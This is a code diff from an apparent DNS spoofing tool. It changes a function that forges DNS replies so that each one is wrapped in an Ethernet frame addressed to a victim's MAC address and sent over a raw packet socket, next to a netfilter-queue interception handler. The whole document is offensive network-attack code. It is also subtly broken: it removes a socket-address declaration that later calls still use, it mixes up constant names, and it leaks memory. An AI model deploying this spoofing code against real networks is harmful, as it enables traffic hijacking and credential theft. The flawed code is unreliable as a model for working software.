@@ -474,26 +474,52 @@ void send_spoofed_dns_reply(char *packet)
     }
     ip_header->check = ~sum;
 
+
+
+
     // send the spoofed DNS reply
+    // attach eth header before packet
+
+    struct ether_header *eth_header = (struct ether_header *)malloc(ETHER_HEADER_LEN);
+    memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);
+    // get the destination MAC address
+    string dst_ip = inet_ntoa(*(in_addr *)&ip_header->daddr);
+    string dst_mac = devices[dst_ip];
+    unsigned char dst_mac_addr[6];
+    sscanf(dst_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &dst_mac_addr[0], &dst_mac_addr[1], &dst_mac_addr[2],
+           &dst_mac_addr[3], &dst_mac_addr[4], &dst_mac_addr[5]);
+    memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
+    eth_header->ether_type = htons(ETH_P_IP);
+    // attach the packet with eth header
+    char *spoofed_packet = (char *)malloc(total_len + ETHER_HEADER_LEN);
+    memcpy(spoofed_packet, eth_header, ETHER_HEADER_LEN);
+    memcpy(spoofed_packet + ETHER_HEADER_LEN, packet, total_len);
+    // send the packet
     int sock_raw_fd;
     if ((sock_raw_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP))) == -1)
     {
         cerr << "Error creating socket." << endl;
     }
 
-    struct sockaddr_ll saddr_ll;
-    bzero(&saddr_ll, sizeof(struct sockaddr_ll));
-    saddr_ll.sll_family = AF_PACKET;
-    saddr_ll.sll_protocol = htons(ETH_P_IP);
-    saddr_ll.sll_ifindex = ifindex;
-    if (sendto(sock_raw_fd, packet, total_len, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll)) < 0)
-    {
-        cerr << "Error sending packet." << endl;
-    }
+    struct sockaddr_ll socket_address;
+    memset(&socket_address, 0, sizeof(socket_address));
+    socket_address.sll_ifindex = ifindex;
+    socket_address.sll_halen = MAC_LENGTH;
+    socket_address.sll_protocol = htons(ETH_P_IP);
+    socket_address.sll_family = AF_PACKET;
+    socket_address.sll_pkttype = PACKET_BROADCAST;
+    socket_address.sll_hatype = htons(ARPHRD_ETHER);
+    unsigned char source_mac_char[6];
+    sscanf(source_mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &source_mac_char[0], &source_mac_char[1], &source_mac_char[2],
+           &source_mac_char[3], &source_mac_char[4], &source_mac_char[5]);
+    
+    memcpy(saddr_ll.sll_addr, source_mac_char, MAC_LEN);
+    sendto(sock_raw_fd, spoofed_packet, total_len + ETHER_HEADER_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
 
     close(sock_raw_fd);
     
-
 }
 static int dns_nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data)
 {
